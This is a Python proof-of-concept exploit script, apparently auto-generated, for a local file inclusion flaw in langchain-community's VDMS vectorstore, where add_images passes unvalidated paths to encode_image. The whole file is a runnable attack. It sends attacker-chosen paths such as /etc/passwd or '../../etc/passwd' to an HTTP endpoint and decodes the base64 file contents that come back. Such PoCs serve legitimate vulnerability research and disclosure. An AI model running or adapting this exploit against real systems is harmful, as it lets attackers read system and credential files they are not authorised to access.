#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-009
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only VDMS vectorstore.

Vulnerability: The `add_images` method accepts a list of file paths (`uris`)
              and passes them directly to `encode_image`, which opens the file
              without any path validation. An attacker can supply paths like
              '../../etc/passwd' to read arbitrary files.

Usage:
    python3 poc_lfi.py [--target http://localhost:8000] [--file /etc/passwd]

Requirements:
    - Python 3.6+
    - requests library (pip install requests)
"""

import argparse
import base64
import sys
import requests
from typing import List, Optional

# Default target URL (simulated endpoint wrapping the vulnerable library)
DEFAULT_TARGET = "http://localhost:8000"
# Default file to read (benign for testing)
DEFAULT_FILE = "/etc/passwd"


def exploit_lfi(target_url: str, file_paths: List[str]) -> None:
    """
    Exploit the LFI vulnerability by sending file paths to the vulnerable endpoint.

    The endpoint is expected to accept a JSON payload with a "uris" field containing
    a list of file paths. The server will read and base64-encode each file, returning
    the encoded data in the response.

    Args:
        target_url: Base URL of the vulnerable service (e.g., http://localhost:8000)
        file_paths: List of file paths to read (e.g., ["../../etc/passwd"])
    """
    # Construct the API endpoint path (adjust if different)
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"

    # Prepare the payload with attacker-controlled file paths
    payload = {"uris": file_paths}

    print(f"[*] Sending request to {endpoint}")
    print(f"[*] Payload: {payload}")

    try:
        # Send POST request with JSON payload
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )

        # Check if request was successful
        if response.status_code == 200:
            print("[+] Request succeeded!")
            result = response.json()
            print(f"[+] Response: {result}")

            # The response should contain base64-encoded file contents
            # (assuming the endpoint returns the encoded images/texts)
            if "b64_texts" in result:
                for i, b64_data in enumerate(result["b64_texts"]):
                    try:
                        decoded = base64.b64decode(b64_data).decode("utf-8", errors="replace")
                        print(f"\n[+] File {file_paths[i]} contents:")
                        print(decoded)
                    except Exception as e:
                        print(f"[-] Failed to decode base64 for file {file_paths[i]}: {e}")
            else:
                print("[*] Response does not contain 'b64_texts' key. Full response:")
                print(response.text)
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text}")

    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {endpoint}")
        print("[-] Ensure the target service is running and accessible.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out. The server may be slow or unreachable.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS vectorstore"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--file",
        default=DEFAULT_FILE,
        help=f"File path to read (default: {DEFAULT_FILE})"
    )
    parser.add_argument(
        "--multiple",
        nargs="+",
        help="Multiple file paths to read (space-separated)"
    )

    args = parser.parse_args()

    # Determine which file paths to use
    if args.multiple:
        file_paths = args.multiple
    else:
        file_paths = [args.file]

    print("[*] LFI Exploit PoC for langchain-community-only")
    print(f"[*] Target: {args.target}")
    print(f"[*] Files to read: {file_paths}")

    # Run the exploit
    exploit_lfi(args.target, file_paths)


if __name__ == "__main__":
    main()
